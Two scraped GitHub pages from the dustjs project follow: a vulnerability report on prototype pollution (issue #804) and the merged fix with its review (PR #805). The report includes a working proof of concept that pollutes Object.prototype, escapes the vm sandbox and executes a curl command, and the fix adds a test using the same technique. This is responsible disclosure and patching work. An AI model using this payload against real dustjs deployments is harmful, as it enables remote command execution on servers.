  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flinkedin%2Fdustjs%2Fissues%2F804)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=linkedin%2Fdustjs)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[linkedin](/linkedin)
/
**[dustjs](/linkedin/dustjs)**
Public

* [Notifications](/login?return_to=%2Flinkedin%2Fdustjs) You must be signed in to change notification settings
* [Fork
  479](/login?return_to=%2Flinkedin%2Fdustjs)
* [Star
   2.9k](/login?return_to=%2Flinkedin%2Fdustjs)

* [Code](/linkedin/dustjs)
* [Issues
  77](/linkedin/dustjs/issues)
* [Pull requests
  6](/linkedin/dustjs/pulls)
* [Actions](/linkedin/dustjs/actions)
* [Projects
  0](/linkedin/dustjs/projects)
* [Wiki](/linkedin/dustjs/wiki)
* [Security](/linkedin/dustjs/security)
* [Insights](/linkedin/dustjs/pulse)

Additional navigation options

* [Code](/linkedin/dustjs)
* [Issues](/linkedin/dustjs/issues)
* [Pull requests](/linkedin/dustjs/pulls)
* [Actions](/linkedin/dustjs/actions)
* [Projects](/linkedin/dustjs/projects)
* [Wiki](/linkedin/dustjs/wiki)
* [Security](/linkedin/dustjs/security)
* [Insights](/linkedin/dustjs/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Flinkedin%2Fdustjs%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Flinkedin%2Fdustjs%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Security bug about prototype pollution #804

Closed

[baiyecha404](/baiyecha404) opened this issue
Mar 24, 2021
¬∑ 1 comment

Closed

# [Security bug about prototype pollution](#top) #804

[baiyecha404](/baiyecha404) opened this issue
Mar 24, 2021
¬∑ 1 comment

## Comments

[![@baiyecha404](https://avatars.githubusercontent.com/u/43843620?s=80&u=72bdb9cee16a2a57c075dafcf9daaf9f755a6343&v=4)](/baiyecha404)

Copy link

### **[baiyecha404](/baiyecha404)** commented [Mar 24, 2021](#issue-839828470)

| Hi, I 'd like to report a security bug. That is, the current version of dustjs is vulnerable to prototype pollution attack. Details will be covered in following contents. reproduce index.js  ``` const dust = require('dustjs-linkedin');   let cmd = "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('curl 127.0.0.1')" Object.prototype.ANY_CODE= [cmd]; const compiled = dust.compile(`{username} is a valid Dust reference.{~n}`); const tmpl = dust.loadSource(compiled); dust.render(tmpl, { username: "byc_404" }, (err, out) => {     if (err) throw err;     console.log(out); }); ```  use `python -m http.server 80` to set up a http server, then execute the code result  ```   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                  Dload  Upload   Total   Spent    Left  Speed   0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--100   694  100   694    0     0    694      0  0:00:01 --:--:--  0:00:01  677k byc_404 is a valid Dust reference.  ```  ``` Serving HTTP on :: port 80 (http://[::]:80/) ... ::ffff:127.0.0.1 - - [24/Mar/2021 22:19:39] "GET / HTTP/1.1" 200 -  ```  Command of `curl` will be executed. Details The code that pollution affected can be found at `compileBlocks` function   [dustjs/lib/compiler.js](https://github.com/linkedin/dustjs/blob/e0e25f7c1bc5905090e8160c28b8e83ab7f34e20/lib/compiler.js#L171-L173)  Lines 171 to 173 in [e0e25f7](/linkedin/dustjs/commit/e0e25f7c1bc5905090e8160c28b8e83ab7f34e20)   |  | compiled += compileBlocks(context) + | | --- | --- | |  | compileBodies(context) + | |  | 'return ' + entry + '}'; |         [dustjs/lib/compiler.js](https://github.com/linkedin/dustjs/blob/e0e25f7c1bc5905090e8160c28b8e83ab7f34e20/lib/compiler.js#L189-L199)  Lines 189 to 199 in [e0e25f7](/linkedin/dustjs/commit/e0e25f7c1bc5905090e8160c28b8e83ab7f34e20)   |  | function compileBlocks(context) { | | --- | --- | |  | var out = [], | |  | blocks = context.blocks, | |  | name; | |  |  | |  | for (name in blocks) { | |  | out.push('"' + name + '":' + blocks[name]); | |  | } | |  | if (out.length) { | |  | context.blocks = 'ctx=ctx.shiftBlocks(blocks);'; | |  | return 'var blocks={' + out.join(',') + '};'; |      `blocks` is an Array attribute of object `context`, and the for loop will visit attribute on prototype, results in `blocks[ANY_CODE]=EVIL_CMD`. The code will be added to `compiled`, then the full compiled code will be evaled and run in vm     [dustjs/index.js](https://github.com/linkedin/dustjs/blob/e0e25f7c1bc5905090e8160c28b8e83ab7f34e20/index.js#L8-L11)  Lines 8 to 11 in [e0e25f7](/linkedin/dustjs/commit/e0e25f7c1bc5905090e8160c28b8e83ab7f34e20)   |  | var context = vm.createContext({dust: dust}); | | --- | --- | |  | dust.loadSource = function(source) { | |  | return vm.runInContext(source, context); | |  | }; |      However, the context of vm here is `{dust: dust}`, so it can be bypassed with `this.constructor.constructor` and get Arbitary Command execution. Suggestion  * For `context` in compile function , use Map or `Object.create(null)` to create it. * For `vm.runInContext` in loadSource function , use `Object.create(null)` to create it , then add `dust` to it. Or vm will be meaningless. |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| The text was updated successfully, but these errors were encountered: |

 üëç
3
 JoseBarrios, hi-unc1e, and jackfromeast reacted with thumbs up emoji

All reactions

* üëç
  3 reactions

[![@baiyecha404](https://avatars.githubusercontent.com/u/43843620?s=80&u=72bdb9cee16a2a57c075dafcf9daaf9f755a6343&v=4)](/baiyecha404)

Copy link

Author

### **[baiyecha404](/baiyecha404)** commented [Mar 26, 2021](#issuecomment-807983426)

| Seems like dustjs is deprecated. I 'll close this issue. |
| --- |

All reactions

Sorry, something went wrong.

[![@baiyecha404](https://avatars.githubusercontent.com/u/43843620?s=40&u=72bdb9cee16a2a57c075dafcf9daaf9f755a6343&v=4)](/baiyecha404)
[baiyecha404](/baiyecha404)
closed this as [completed](/linkedin/dustjs/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Mar 26, 2021](#event-4512125175)

[![@sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=40&v=4)](/sumeetkakkar)
[sumeetkakkar](/sumeetkakkar)
mentioned this issue
[Sep 8, 2021](#ref-pullrequest-991597586)

[fix: Security bug about prototype pollution
#805](/linkedin/dustjs/pull/805)
 Merged

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
mentioned this issue
[Jun 6, 2024](#ref-issue-2338995475)

[High severity - Prototype Pollution vulnerability in dustjs-linkedin (package.json)
pickford-snyk/nodejs-goof#32](/pickford-snyk/nodejs-goof/issues/32)

Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Flinkedin%2Fdustjs%2Fissues%2F804)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

1 participant

[![@baiyecha404](https://avatars.githubusercontent.com/u/43843620?s=52&v=4)](/baiyecha404)

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_c28057d1_20250114_192339.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flinkedin%2Fdustjs%2Fpull%2F805)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flinkedin%2Fdustjs%2Fpull%2F805)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=linkedin%2Fdustjs)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[linkedin](/linkedin)
/
**[dustjs](/linkedin/dustjs)**
Public

* [Notifications](/login?return_to=%2Flinkedin%2Fdustjs) You must be signed in to change notification settings
* [Fork
  479](/login?return_to=%2Flinkedin%2Fdustjs)
* [Star
   2.9k](/login?return_to=%2Flinkedin%2Fdustjs)

* [Code](/linkedin/dustjs)
* [Issues
  77](/linkedin/dustjs/issues)
* [Pull requests
  6](/linkedin/dustjs/pulls)
* [Actions](/linkedin/dustjs/actions)
* [Projects
  0](/linkedin/dustjs/projects)
* [Wiki](/linkedin/dustjs/wiki)
* [Security](/linkedin/dustjs/security)
* [Insights](/linkedin/dustjs/pulse)

Additional navigation options

* [Code](/linkedin/dustjs)
* [Issues](/linkedin/dustjs/issues)
* [Pull requests](/linkedin/dustjs/pulls)
* [Actions](/linkedin/dustjs/actions)
* [Projects](/linkedin/dustjs/projects)
* [Wiki](/linkedin/dustjs/wiki)
* [Security](/linkedin/dustjs/security)
* [Insights](/linkedin/dustjs/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Flinkedin%2Fdustjs%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Flinkedin%2Fdustjs%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# fix: Security bug about prototype pollution #805

 Merged

[sumeetkakkar](/sumeetkakkar)
merged 1 commit into
[linkedin:master](/linkedin/dustjs/tree/master "linkedin/dustjs:master")
from
[sumeetkakkar:fix/proto-pollution](/sumeetkakkar/dustjs/tree/fix/proto-pollution "sumeetkakkar/dustjs:fix/proto-pollution")

Oct 13, 2021

 Merged

# [fix: Security bug about prototype pollution](#top) #805

[sumeetkakkar](/sumeetkakkar)
merged 1 commit into
[linkedin:master](/linkedin/dustjs/tree/master "linkedin/dustjs:master")
from
[sumeetkakkar:fix/proto-pollution](/sumeetkakkar/dustjs/tree/fix/proto-pollution "sumeetkakkar/dustjs:fix/proto-pollution")

Oct 13, 2021

+907

‚àí741

[Conversation
5](/linkedin/dustjs/pull/805)
[Commits
1](/linkedin/dustjs/pull/805/commits)
[Checks
0](/linkedin/dustjs/pull/805/checks)
[Files changed
9](/linkedin/dustjs/pull/805/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=60&v=4)](/sumeetkakkar)

Copy link

Collaborator

### @sumeetkakkar **[sumeetkakkar](/sumeetkakkar)** commented [Sep 8, 2021](#issue-991597586)

Refer [#804](https://github.com/linkedin/dustjs/issues/804)

Sorry, something went wrong.

 üéâ
1
 grawk reacted with hooray emoji

All reactions

* üéâ
  1 reaction

 [![@sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=40&v=4)](/sumeetkakkar)
[sumeetkakkar](/sumeetkakkar)
[force-pushed](/linkedin/dustjs/compare/1b8adb73d55fd8c68fd0b3af161603323e40ce15..67e03cb77c38c52b09bbe8054d30a68690b8aa8f)
the
fix/proto-pollution

branch
from
[`1b8adb7`](/linkedin/dustjs/commit/1b8adb73d55fd8c68fd0b3af161603323e40ce15) to
[`67e03cb`](/linkedin/dustjs/commit/67e03cb77c38c52b09bbe8054d30a68690b8aa8f)  [Compare](/linkedin/dustjs/compare/1b8adb73d55fd8c68fd0b3af161603323e40ce15..67e03cb77c38c52b09bbe8054d30a68690b8aa8f)
[September 9, 2021 00:08](#event-5275322131)

[![@sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=80&v=4)](/sumeetkakkar)

Copy link

Collaborator

Author

### **[sumeetkakkar](/sumeetkakkar)** commented [Sep 9, 2021](#issuecomment-916308897)

| ``` $ npm run test  > dustjs-linkedin@2.7.2 test /Users/.../dustjs > grunt travis  Running "jasmine_nodejs:templates" (jasmine_nodejs) task  >> Executing 729 defined specs... >> Done!   >> Successful!  Running "jasmine_nodejs:core" (jasmine_nodejs) task  >> Executing 24 defined specs... >> Done!   >> Successful!  Running "jasmine_nodejs:cjs" (jasmine_nodejs) task  >> Executing 8 defined specs... >> Done!   >> Successful!  Running "jasmine_nodejs:dustc" (jasmine_nodejs) task  >> Executing 15 defined specs... >> Done!   >> Successful!  Done.   ``` |
| --- |

All reactions

Sorry, something went wrong.

[![kumarrishav](https://avatars.githubusercontent.com/u/4078325?s=60&v=4)](/kumarrishav)

**[kumarrishav](/kumarrishav)**
reviewed
[Sep 20, 2021](#pullrequestreview-759161859)

 [View reviewed changes](/linkedin/dustjs/pull/805/files)

[test/core.spec.js](/linkedin/dustjs/pull/805/files#diff-8b70001a30f15b76217a7045cea8065dd7e35444e433eebd84f72b20ec7fbe57)

|  |  | Object.prototype.MAL\_CODE= [ malicious ]; |
| --- | --- | --- |
|  |  | const compiled = dust.compile('{username} is an important person.{~n}'); |
|  |  | const tmpl = dust.loadSource(compiled); |
|  |  | dust.render(tmpl, { username: 'Jane Doe' }, (err, output) => { |

Copy link

### @kumarrishav **[kumarrishav](/kumarrishav)** [Sep 20, 2021](#discussion_r712567389)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

how did we test this?

what should be the result of this test without the above fix

Sorry, something went wrong.

All reactions

Copy link

Collaborator

Author

### @sumeetkakkar **[sumeetkakkar](/sumeetkakkar)** [Sep 21, 2021](#discussion_r712664078)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

It will execute `curl 127.0.0.1` and the test fails

Sorry, something went wrong.

All reactions

[![@sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=40&v=4)](/sumeetkakkar)

`[fix for prototype pollution vulnerability](/linkedin/dustjs/pull/805/commits/ddb6523832465d38c9d80189e9de60519ac307c3 "fix for prototype pollution vulnerability")`

`[ddb6523](/linkedin/dustjs/pull/805/commits/ddb6523832465d38c9d80189e9de60519ac307c3)`

 [![@sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=40&v=4)](/sumeetkakkar)
[sumeetkakkar](/sumeetkakkar)
[force-pushed](/linkedin/dustjs/compare/67e03cb77c38c52b09bbe8054d30a68690b8aa8f..ddb6523832465d38c9d80189e9de60519ac307c3)
the
fix/proto-pollution

branch
from
[`67e03cb`](/linkedin/dustjs/commit/67e03cb77c38c52b09bbe8054d30a68690b8aa8f) to
[`ddb6523`](/linkedin/dustjs/commit/ddb6523832465d38c9d80189e9de60519ac307c3)  [Compare](/linkedin/dustjs/compare/67e03cb77c38c52b09bbe8054d30a68690b8aa8f..ddb6523832465d38c9d80189e9de60519ac307c3)
[October 12, 2021 20:57](#event-5452579240)

[![kumarrishav](https://avatars.githubusercontent.com/u/4078325?s=60&v=4)](/kumarrishav)

**[kumarrishav](/kumarrishav)**
approved these changes
[Oct 13, 2021](#pullrequestreview-779010701)

 [View reviewed changes](/linkedin/dustjs/pull/805/files/ddb6523832465d38c9d80189e9de60519ac307c3)

[![grawk](https://avatars.githubusercontent.com/u/1031360?s=60&v=4)](/grawk)

**[grawk](/grawk)**
approved these changes
[Oct 13, 2021](#pullrequestreview-779051325)

 [View reviewed changes](/linkedin/dustjs/pull/805/files/ddb6523832465d38c9d80189e9de60519ac307c3)

[dist/dust-core.js](/linkedin/dustjs/pull/805/files/ddb6523832465d38c9d80189e9de60519ac307c3#diff-499cf69cd397a874a93399f5d6b3bd95bfc373b7e20abb8cb524d4579365cf51)

|  |  | @@ -70,6 +70,9 @@ | |
| --- | --- | --- | --- |
|  |  | type = type || INFO; |
|  |  | if (loggingLevels[type] >= loggingLevels[dust.debugLevel]) { |
|  |  | log('[DUST:' + type + ']', message); |
|  |  | if (type === ERROR && dust.debugLevel === DEBUG && message instanceof Error && message.stack) { |

Copy link

Collaborator

### @grawk **[grawk](/grawk)** [Oct 13, 2021](#discussion_r728417866)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Were errors just logging [Object] or something like that before this change?

Sorry, something went wrong.

All reactions

Copy link

Collaborator

Author

### @sumeetkakkar **[sumeetkakkar](/sumeetkakkar)** [Oct 13, 2021](#discussion_r728503378)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

This is generated file.

The primary code change I added is in <https://github.com/linkedin/dustjs/pull/805/files#diff-544803892ac752aa674ffa81380c022af562eda776860d94eb5c2d3bdb59c99c>

Sorry, something went wrong.

All reactions

[![@sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=40&v=4)](/sumeetkakkar)
[sumeetkakkar](/sumeetkakkar)
merged commit [`db6d8b9`](/linkedin/dustjs/commit/db6d8b91880ce73a065935c4d04b93abd6968b7f)
into
linkedin:master

[Oct 13, 2021](https://github.com/linkedin/dustjs/pull/805#event-5460410508)

 [![@sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=40&v=4)](/sumeetkakkar)
[sumeetkakkar](/sumeetkakkar)
deleted the
fix/proto-pollution

branch
[October 13, 2021 23:53](#event-5460410851)

This was referenced Dec 30, 2021

[[Snyk] Security upgrade dustjs-linkedin from 2.7.5 to 3.0.1
Natural-Intelligence/dustjs#4](/Natural-Intelligence/dustjs/pull/4)
 Open

[[Snyk] Security upgrade dustjs-linkedin from 2.7.5 to 3.0.1
Natural-Intelligence/dustjs#5](/Natural-Intelligence/dustjs/pull/5)
 Open

[[Snyk] Security upgrade dustjs-linkedin from 2.7.5 to 3.0.1
Natural-Intelligence/dustjs#6](/Natural-Intelligence/dustjs/pull/6)
 Open

[[Snyk] Security upgrade dustjs-linkedin from 2.7.5 to 3.0.1
Natural-Intelligence/dustjs#7](/Natural-Intelligence/dustjs/pull/7)
 Open

[[Snyk] Security upgrade dustjs-linkedin from 2.7.5 to 3.0.1
Natural-Intelligence/dustjs#8](/Natural-Intelligence/dustjs/pull/8)
 Open

[![@captainbarber99](https://avatars.githubusercontent.com/u/20229276?s=40&v=4)](/captainbarber99)
[captainbarber99](/captainbarber99)
mentioned this pull request
[Nov 28, 2023](#ref-pullrequest-2015164017)

[[Snyk] Security upgrade dustjs-linkedin from 2.7.5 to 3.0.1
captainbarber99/dustjs#6](/captainbarber99/dustjs/pull/6)
 Open

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)
[github-actions](/apps/github-actions)
bot
mentioned this pull request
[Jun 6, 2024](#ref-issue-2338995475)

[High severity - Prototype Pollution vulnerability in dustjs-linkedin (package.json)
pickford-snyk/nodejs-goof#32](/pickford-snyk/nodejs-goof/issues/32)

Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Flinkedin%2Fdustjs%2Fpull%2F805)

Reviewers

[![@kumarrishav](https://avatars.githubusercontent.com/u/4078325?s=40&v=4)](/kumarrishav) [kumarrishav](/kumarrishav)

kumarrishav approved these changes

[![@grawk](https://avatars.githubusercontent.com/u/1031360?s=40&v=4)](/grawk) [grawk](/grawk)

grawk approved these changes

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

3 participants

[![@sumeetkakkar](https://avatars.githubusercontent.com/u/12142941?s=52&v=4)](/sumeetkakkar) [![@grawk](https://avatars.githubusercontent.com/u/1031360?s=52&v=4)](/grawk) [![@kumarrishav](https://avatars.githubusercontent.com/u/4078325?s=52&v=4)](/kumarrishav)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.


